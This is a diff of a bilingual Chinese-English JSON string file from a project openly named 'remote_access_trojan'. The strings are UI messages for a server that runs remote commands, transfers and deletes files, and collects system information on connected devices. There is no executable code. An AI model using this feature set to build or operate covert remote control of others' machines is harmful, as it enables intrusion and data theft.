@@ -1,267 +1,215 @@
 {
-    "server_init": {
-        "zh": "服务器初始化",
-        "en": "Server initialization"
-    },
     "about": {
         "zh": "关于：\n作者：赵博凯\n版权：Copyright © 赵博凯, All Rights Reserved.\n此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\n使用GPL v3协议，请自觉遵守协议。",
         "en": "About:\nAuthor: Zhao Bokai\nCopyright: Copyright © Zhao Bokai, All Rights Reserved.\nThis is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]\nUses GPL v3 license, please comply with the license."
-    },
-    "getting_client_list": {
-        "zh": "获取客户端列表",
-        "en": "Getting client list"
-    },
-    "no_connected_devices": {
-        "zh": "当前无连接设备",
-        "en": "No connected devices currently"
-    },
-    "no_devices_connected": {
-        "zh": "当前没有设备连接。",
-        "en": "No devices are currently connected."
-    },
-    "device_list": {
-        "zh": "设备列表",
-        "en": "Device list"
-    },
-    "deleting_device": {
-        "zh": "删除设备",
-        "en": "Deleting device"
-    },
-    "device_deleted_successfully": {
-        "zh": "设备删除成功",
-        "en": "Device deleted successfully"
-    },
-    "successfully_deleted_device": {
-        "zh": "成功删除ID为",
-        "en": "Successfully deleted device with ID"
-    },
-    "failed_to_delete_device": {
-        "zh": "删除设备失败",
-        "en": "Failed to delete device"
-    },
-    "exception_occurred_while_disconnecting": {
-        "zh": "断开设备ID为",
-        "en": "Exception occurred while disconnecting device with ID"
-    },
-    "device_does_not_exist": {
-        "zh": "设备不存在",
-        "en": "Device does not exist"
-    },
-    "device_with_id_does_not_exist": {
-        "zh": "设备不存在：",
-        "en": "Device does not exist: "
-    },
-    "initializing_client_controller": {
-        "zh": "初始化客户端控制器",
-        "en": "Initializing client controller"
-    },
-    "getting_file_list": {
-        "zh": "正在获取文件列表",
-        "en": "Getting file list"
-    },
-    "file_list": {
-        "zh": "文件列表",
-        "en": "File list"
-    },
-    "failed_to_get_file_list": {
-        "zh": "获取文件列表失败",
-        "en": "Failed to get file list"
-    },
-    "getting_current_directory": {
-        "zh": "正在获取当前目录",
-        "en": "Getting current directory"
-    },
-    "current_directory": {
-        "zh": "当前工作目录",
-        "en": "Current working directory"
-    },
-    "failed_to_get_current_directory": {
-        "zh": "获取当前目录失败",
-        "en": "Failed to get current directory"
-    },
-    "getting_device_system_information": {
-        "zh": "获取设备的系统信息",
-        "en": "Getting device system information"
-    },
-    "system_information": {
-        "zh": "系统信息",
-        "en": "System information"
-    },
-    "failed_to_get_system_information": {
-        "zh": "获取系统信息失败",
-        "en": "Failed to get system information"
-    },
-    "executing_command": {
-        "zh": "执行命令",
-        "en": "Executing command"
-    },
-    "command_result": {
-        "zh": "命令结果",
-        "en": "Command result"
-    },
-    "command_execution_failed": {
-        "zh": "命令执行失败",
-        "en": "Command execution failed"
-    },
-    "executing_command_in_background": {
-        "zh": "后台执行命令",
-        "en": "Executing command in background"
-    },
-    "background_command_sent_successfully": {
-        "zh": "后台命令发送成功",
-        "en": "Background command sent successfully"
-    },
-    "command_sent": {
-        "zh": "命令已发送",
-        "en": "Command sent"
     },
     "background_command_execution_failed": {
         "zh": "后台命令执行失败",
         "en": "Background command execution failed"
     },
+    "background_command_sent_successfully": {
+        "zh": "后台命令发送成功",
+        "en": "Background command sent successfully"
+    },
+    "certificate_file_not_found": {
+        "zh": "证书文件不存在",
+        "en": "Certificate file not found"
+    },
+    "certificate_path": {
+        "zh": "证书路径",
+        "en": "Certificate path"
+    },
     "changing_directory": {
         "zh": "切换目录",
         "en": "Changing directory"
     },
-    "directory_change_result": {
-        "zh": "目录切换结果",
-        "en": "Directory change result"
+    "client_connected_successfully": {
+        "zh": "客户端连接成功",
+        "en": "Client connected successfully"
     },
-    "directory_change_failed": {
-        "zh": "目录切换失败",
-        "en": "Directory change failed"
+    "client_disconnected": {
+        "zh": "客户端断开连接",
+        "en": "Client disconnected"
     },
-    "performing_security_verification": {
-        "zh": "执行安全验证",
-        "en": "Performing security verification"
+    "client_system_information": {
+        "zh": "客户端系统信息",
+        "en": "Client system information"
     },
-    "request_cookies": {
-        "zh": "请求cookies",
-        "en": "Request cookies"
-    },
-    "cookie_not_found": {
-        "zh": "未找到Cookie",
-        "en": "Cookie not found"
-    },
-    "verification_passed": {
-        "zh": "验证通过",
-        "en": "Verification passed"
-    },
-    "verification_failed": {
-        "zh": "验证失败",
-        "en": "Verification failed"
-    },
-    "received_password_verification_request": {
-        "zh": "收到密码验证请求",
-        "en": "Received password verification request"
-    },
-    "password_not_provided": {
-        "zh": "未提供密码",
-        "en": "Password not provided"
-    },
-    "password_verification_successful": {
-        "zh": "密码验证成功",
-        "en": "Password verification successful"
-    },
-    "incorrect_password": {
-        "zh": "密码错误",
-        "en": "Incorrect password"
-    },
-    "verification_process_error": {
-        "zh": "验证过程错误",
-        "en": "Verification process error"
-    },
-    "server_error": {
-        "zh": "服务器错误",
-        "en": "Server error"
-    },
-    "received_function_request": {
-        "zh": "收到功能请求",
-        "en": "Received function request"
-    },
-    "unauthorized_request": {
-        "zh": "未授权请求",
-        "en": "Unauthorized request"
-    },
-    "request_data": {
-        "zh": "请求数据",
-        "en": "Request data"
-    },
-    "function_name_not_provided": {
-        "zh": "未提供函数名",
-        "en": "Function name not provided"
-    },
-    "requested_function": {
-        "zh": "请求功能",
-        "en": "Requested function"
-    },
-    "invalid_function": {
-        "zh": "无效功能",
-        "en": "Invalid function"
-    },
-    "invalid_function_name_provided": {
-        "zh": "未提供有效的函数名",
-        "en": "Invalid function name provided"
-    },
-    "device_id_not_provided": {
-        "zh": "未提供设备ID",
-        "en": "Device ID not provided"
-    },
-    "target_device": {
-        "zh": "目标设备",
-        "en": "Target device"
+    "command_execution_failed": {
+        "zh": "命令执行失败",
+        "en": "Command execution failed"
     },
     "command_not_provided": {
         "zh": "未提供命令",
         "en": "Command not provided"
     },
+    "command_result": {
+        "zh": "命令结果",
+        "en": "Command result"
+    },
+    "command_sent": {
+        "zh": "命令已发送",
+        "en": "Command sent"
+    },
+    "compressing_file": {
+        "zh": "正在压缩文件",
+        "en": "Compressing file"
+    },
+    "connection_exception": {
+        "zh": "连接异常",
+        "en": "Connection exception"
+    },
+    "cookie_not_found": {
+        "zh": "未找到Cookie",
+        "en": "Cookie not found"
+    },
+    "copying_file": {
+        "zh": "正在复制文件",
+        "en": "Copying file"
+    },
+    "copyright": {
+        "zh": "版权所有：Copyright © 赵博凯, All Rights Reserved.",
+        "en": "Copyright: Copyright © Zhao Bokai, All Rights Reserved."
+    },
+    "creating_directory": {
+        "zh": "正在创建目录",
+        "en": "Creating directory"
+    },
+    "current_directory": {
+        "zh": "当前工作目录",
+        "en": "Current working directory"
+    },
+    "deleting_device": {
+        "zh": "删除设备",
+        "en": "Deleting device"
+    },
+    "deleting_file": {
+        "zh": "正在删除文件",
+        "en": "Deleting file"
+    },
+    "device_deleted_successfully": {
+        "zh": "设备删除成功",
+        "en": "Device deleted successfully"
+    },
+    "device_does_not_exist": {
+        "zh": "设备不存在",
+        "en": "Device does not exist"
+    },
+    "device_id_not_provided": {
+        "zh": "未提供设备ID",
+        "en": "Device ID not provided"
+    },
+    "device_list": {
+        "zh": "设备列表",
+        "en": "Device list"
+    },
+    "device_with_id_does_not_exist": {
+        "zh": "设备不存在：",
+        "en": "Device does not exist: "
+    },
+    "directory_change_failed": {
+        "zh": "目录切换失败",
+        "en": "Directory change failed"
+    },
+    "directory_change_result": {
+        "zh": "目录切换结果",
+        "en": "Directory change result"
+    },
+    "directory_creation_failed": {
+        "zh": "目录创建失败",
+        "en": "Directory creation failed"
+    },
+    "directory_creation_result": {
+        "zh": "目录创建结果",
+        "en": "Directory creation result"
+    },
     "directory_not_provided": {
         "zh": "未提供目录",
         "en": "Directory not provided"
     },
-    "file_not_provided": {
-        "zh": "未提供文件",
-        "en": "File not provided"
-    },
-    "path_not_provided": {
-        "zh": "未提供路径",
-        "en": "Path not provided"
-    },
-    "uploading_file": {
-        "zh": "正在上传文件",
-        "en": "Uploading file"
-    },
-    "file_upload_failed": {
-        "zh": "文件上传失败",
-        "en": "File upload failed"
-    },
-    "rewriting_file": {
-        "zh": "正在重写文件",
-        "en": "Rewriting file"
-    },
-    "sending_chunk": {
-        "zh": "正在发送文件块",
-        "en": "Sending chunk"
-    },
-    "upload_result": {
-        "zh": "上传结果",
-        "en": "Upload result"
-    },
-    "file_uploaded_successfully": {
-        "zh": "文件上传成功",
-        "en": "File uploaded successfully"
-    },
-    "generated_random_file_name": {
-        "zh": "生成随机文件名",
-        "en": "Generated random file name"
+    "download_directory_created": {
+        "zh": "下载目录已创建",
+        "en": "Download directory created"
     },
     "downloading_file": {
         "zh": "正在下载文件",
         "en": "Downloading file"
     },
-    "received_chunk_length": {
-        "zh": "收到文件块长度",
-        "en": "Received chunk length"
+    "exception_occurred_while_disconnecting": {
+        "zh": "断开设备ID为",
+        "en": "Exception occurred while disconnecting device with ID"
+    },
+    "executing_command": {
+        "zh": "执行命令",
+        "en": "Executing command"
+    },
+    "executing_command_in_background": {
+        "zh": "后台执行命令",
+        "en": "Executing command in background"
+    },
+    "extracting_file": {
+        "zh": "正在解压文件",
+        "en": "Extracting file"
+    },
+    "failed_to_compress_file": {
+        "zh": "文件压缩失败",
+        "en": "Failed to compress file"
+    },
+    "failed_to_copy_file": {
+        "zh": "文件复制失败",
+        "en": "File copy failed"
+    },
+    "failed_to_create_download_directory": {
+        "zh": "创建下载目录失败",
+        "en": "Failed to create download directory"
+    },
+    "failed_to_delete_device": {
+        "zh": "删除设备失败",
+        "en": "Failed to delete device"
+    },
+    "failed_to_delete_file": {
+        "zh": "删除文件失败",
+        "en": "Failed to delete file"
+    },
+    "failed_to_extract_file": {
+        "zh": "文件解压失败",
+        "en": "Failed to extract file"
+    },
+    "failed_to_get_current_directory": {
+        "zh": "获取当前目录失败",
+        "en": "Failed to get current directory"
+    },
+    "failed_to_get_file_list": {
+        "zh": "获取文件列表失败",
+        "en": "Failed to get file list"
+    },
+    "failed_to_get_system_info": {
+        "zh": "获取系统信息失败",
+        "en": "Failed to get system information"
+    },
+    "failed_to_get_system_information": {
+        "zh": "获取系统信息失败",
+        "en": "Failed to get system information"
+    },
+    "failed_to_move_file": {
+        "zh": "移动文件失败",
+        "en": "Failed to move file"
+    },
+    "fatal_error": {
+        "zh": "致命错误",
+        "en": "Fatal error"
+    },
+    "file_compression_result": {
+        "zh": "文件压缩结果",
+        "en": "File compression result"
+    },
+    "file_copy_result": {
+        "zh": "文件复制结果",
+        "en": "File copy result"
+    },
+    "file_deletion_result": {
+        "zh": "文件删除结果",
+        "en": "File deletion result"
     },
     "file_download_failed": {
         "zh": "文件下载失败",
@@ -271,81 +219,197 @@
         "zh": "文件下载成功",
         "en": "File downloaded successfully"
     },
-    "received_file_download_request": {
-        "zh": "收到文件下载请求",
-        "en": "Received file download request"
+    "file_extraction_result": {
+        "zh": "文件解压结果",
+        "en": "File extraction result"
     },
-    "creating_directory": {
-        "zh": "正在创建目录",
-        "en": "Creating directory"
+    "file_list": {
+        "zh": "文件列表",
+        "en": "File list"
     },
-    "directory_creation_result": {
-        "zh": "目录创建结果",
-        "en": "Directory creation result"
+    "file_move_result": {
+        "zh": "文件移动结果",
+        "en": "File move result"
     },
-    "directory_creation_failed": {
-        "zh": "目录创建失败",
-        "en": "Directory creation failed"
+    "file_name_not_provided": {
+        "zh": "未提供文件名",
+        "en": "File name not provided"
     },
-    "copying_file": {
-        "zh": "正在复制文件",
-        "en": "Copying file"
+    "file_not_provided": {
+        "zh": "未提供文件",
+        "en": "File not provided"
     },
-    "file_copy_result": {
-        "zh": "文件复制结果",
-        "en": "File copy result"
+    "file_upload_failed": {
+        "zh": "文件上传失败",
+        "en": "File upload failed"
     },
-    "failed_to_copy_file": {
-        "zh": "文件复制失败",
-        "en": "File copy failed"
+    "file_uploaded_successfully": {
+        "zh": "文件上传成功",
+        "en": "File uploaded successfully"
     },
-    "request_processing_error": {
-        "zh": "请求处理错误",
-        "en": "Request processing error"
+    "function_name_not_provided": {
+        "zh": "未提供函数名",
+        "en": "Function name not provided"
     },
-    "new_client_connected": {
-        "zh": "新客户端连接",
-        "en": "New client connected"
+    "generated_random_file_name": {
+        "zh": "生成随机文件名",
+        "en": "Generated random file name"
     },
-    "client_system_information": {
-        "zh": "客户端系统信息",
-        "en": "Client system information"
+    "getting_client_list": {
+        "zh": "获取客户端列表",
+        "en": "Getting client list"
     },
-    "failed_to_get_system_info": {
-        "zh": "获取系统信息失败",
-        "en": "Failed to get system information"
+    "getting_current_directory": {
+        "zh": "正在获取当前目录",
+        "en": "Getting current directory"
     },
-    "client_connected_successfully": {
-        "zh": "客户端连接成功",
-        "en": "Client connected successfully"
+    "getting_device_system_information": {
+        "zh": "获取设备的系统信息",
+        "en": "Getting device system information"
     },
-    "connection_exception": {
-        "zh": "连接异常",
-        "en": "Connection exception"
+    "getting_file_list": {
+        "zh": "正在获取文件列表",
+        "en": "Getting file list"
     },
-    "client_disconnected": {
-        "zh": "客户端断开连接",
-        "en": "Client disconnected"
+    "incorrect_password": {
+        "zh": "密码错误",
+        "en": "Incorrect password"
+    },
+    "initializing_client_controller": {
+        "zh": "初始化客户端控制器",
+        "en": "Initializing client controller"
     },
     "initializing_server": {
         "zh": "初始化服务器",
         "en": "Initializing server"
     },
-    "certificate_path": {
-        "zh": "证书路径",
-        "en": "Certificate path"
+    "invalid_function": {
+        "zh": "无效功能",
+        "en": "Invalid function"
+    },
+    "invalid_function_name_provided": {
+        "zh": "未提供有效的函数名",
+        "en": "Invalid function name provided"
+    },
+    "json_decode_error": {
+        "zh": "JSON解码错误",
+        "en": "JSON decode error"
     },
     "key_path": {
         "zh": "密钥路径",
         "en": "Key path"
     },
+    "moving_file": {
+        "zh": "正在移动文件",
+        "en": "moving file"
+    },
+    "new_client_connected": {
+        "zh": "新客户端连接",
+        "en": "New client connected"
+    },
+    "no_connected_devices": {
+        "zh": "当前无连接设备",
+        "en": "No connected devices currently"
+    },
+    "no_devices_connected": {
+        "zh": "当前没有设备连接。",
+        "en": "No devices are currently connected."
+    },
+    "password_not_provided": {
+        "zh": "未提供密码",
+        "en": "Password not provided"
+    },
+    "password_verification_successful": {
+        "zh": "密码验证成功",
+        "en": "Password verification successful"
+    },
+    "path_not_provided": {
+        "zh": "未提供路径",
+        "en": "Path not provided"
+    },
+    "performing_security_verification": {
+        "zh": "执行安全验证",
+        "en": "Performing security verification"
+    },
+    "please_report_to_issues": {
+        "zh": "请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]",
+        "en": "Please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]"
+    },
+    "program_error": {
+        "zh": "程序错误",
+        "en": "Program error"
+    },
+    "program_interrupted_by_user": {
+        "zh": "程序被用户中断",
+        "en": "Program interrupted by user"
+    },
+    "program_starting": {
+        "zh": "程序启动",
+        "en": "Program starting"
+    },
+    "received_chunk_length": {
+        "zh": "收到文件块长度",
+        "en": "Received chunk length"
+    },
+    "received_file_download_request": {
+        "zh": "收到文件下载请求",
+        "en": "Received file download request"
+    },
+    "received_function_request": {
+        "zh": "收到功能请求",
+        "en": "Received function request"
+    },
+    "received_password_verification_request": {
+        "zh": "收到密码验证请求",
+        "en": "Received password verification request"
+    },
+    "request_cookies": {
+        "zh": "请求cookies",
+        "en": "Request cookies"
+    },
+    "request_data": {
+        "zh": "请求数据",
+        "en": "Request data"
+    },
+    "request_processing_error": {
+        "zh": "请求处理错误",
+        "en": "Request processing error"
+    },
+    "requested_function": {
+        "zh": "请求功能",
+        "en": "Requested function"
+    },
+    "rewriting_file": {
+        "zh": "正在重写文件",
+        "en": "Rewriting file"
+    },
+    "sending_chunk": {
+        "zh": "正在发送文件块",
+        "en": "Sending chunk"
+    },
+    "server_error": {
+        "zh": "服务器错误",
+        "en": "Server error"
+    },
+    "server_init": {
+        "zh": "服务器初始化",
+        "en": "Server initialization"
+    },
+    "server_interrupted_by_user": {
+        "zh": "服务器被用户中断",
+        "en": "Server interrupted by user"
+    },
+    "server_started_successfully": {
+        "zh": "服务器启动成功",
+        "en": "Server started successfully"
+    },
+    "server_startup_failed": {
+        "zh": "服务器启动失败",
+        "en": "Server startup failed"
+    },
     "ssl_certificate_loaded_successfully": {
         "zh": "SSL证书加载成功",
         "en": "SSL certificate loaded successfully"
-    },
-    "certificate_file_not_found": {
-        "zh": "证书文件不存在",
-        "en": "Certificate file not found"
     },
     "ssl_loading_failed": {
         "zh": "SSL加载失败",
@@ -355,100 +419,44 @@
         "zh": "启动服务器",
         "en": "Starting server"
     },
-    "server_started_successfully": {
-        "zh": "服务器启动成功",
-        "en": "Server started successfully"
+    "successfully_deleted_device": {
+        "zh": "成功删除ID为",
+        "en": "Successfully deleted device with ID"
     },
-    "server_interrupted_by_user": {
-        "zh": "服务器被用户中断",
-        "en": "Server interrupted by user"
+    "system_information": {
+        "zh": "系统信息",
+        "en": "System information"
     },
-    "server_startup_failed": {
-        "zh": "服务器启动失败",
-        "en": "Server startup failed"
+    "target_device": {
+        "zh": "目标设备",
+        "en": "Target device"
     },
-    "download_directory_created": {
-        "zh": "下载目录已创建",
-        "en": "Download directory created"
+    "unauthorized_request": {
+        "zh": "未授权请求",
+        "en": "Unauthorized request"
     },
-    "failed_to_create_download_directory": {
-        "zh": "创建下载目录失败",
-        "en": "Failed to create download directory"
+    "upload_result": {
+        "zh": "上传结果",
+        "en": "Upload result"
     },
-    "program_starting": {
-        "zh": "程序启动",
-        "en": "Program starting"
+    "uploading_file": {
+        "zh": "正在上传文件",
+        "en": "Uploading file"
     },
-    "program_error": {
-        "zh": "程序错误",
-        "en": "Program error"
+    "verification_failed": {
+        "zh": "验证失败",
+        "en": "Verification failed"
     },
-    "copyright": {
-        "zh": "版权所有：Copyright © 赵博凯, All Rights Reserved.",
-        "en": "Copyright: Copyright © Zhao Bokai, All Rights Reserved."
+    "verification_passed": {
+        "zh": "验证通过",
+        "en": "Verification passed"
     },
-    "program_interrupted_by_user": {
-        "zh": "程序被用户中断",
-        "en": "Program interrupted by user"
+    "verification_process_error": {
+        "zh": "验证过程错误",
+        "en": "Verification process error"
     },
-    "fatal_error": {
-        "zh": "致命错误",
-        "en": "Fatal error"
-    },
-    "please_report_to_issues": {
-        "zh": "请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]",
-        "en": "Please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]"
-    },
-    "deleting_file": {
-        "zh": "正在删除文件",
-        "en": "Deleting file"
-    },
-    "file_deletion_result": {
-        "zh": "文件删除结果",
-        "en": "File deletion result"
-    },
-    "failed_to_delete_file": {
-        "zh": "删除文件失败",
-        "en": "Failed to delete file"
-    },
-    "moving_file": {
-        "zh": "正在移动文件",
-        "en": "moving file"
-    },
-    "file_move_result": {
-        "zh": "文件移动结果",
-        "en": "File move result"
-    },
-    "failed_to_move_file": {
-        "zh": "移动文件失败",
-        "en": "Failed to move file"
-    },
-    "compressing_file": {
-        "zh": "正在压缩文件",
-        "en": "Compressing file"
-    },
-    "file_compression_result": {
-        "zh": "文件压缩结果",
-        "en": "File compression result"
-    },
-    "failed_to_compress_file": {
-        "zh": "文件压缩失败",
-        "en": "Failed to compress file"
-    },
-    "extracting_file": {
-        "zh": "正在解压文件",
-        "en": "Extracting file"
-    },
-    "file_extraction_result": {
-        "zh": "文件解压结果",
-        "en": "File extraction result"
-    },
-    "failed_to_extract_file": {
-        "zh": "文件解压失败",
-        "en": "Failed to extract file"
-    },
-    "file_name_not_provided": {
-        "zh": "未提供文件名",
-        "en": "File name not provided"
+    "device_operation_timeout": {
+        "zh": "设备操作超时",
+        "en": "Device operation timeout"
     }
 }
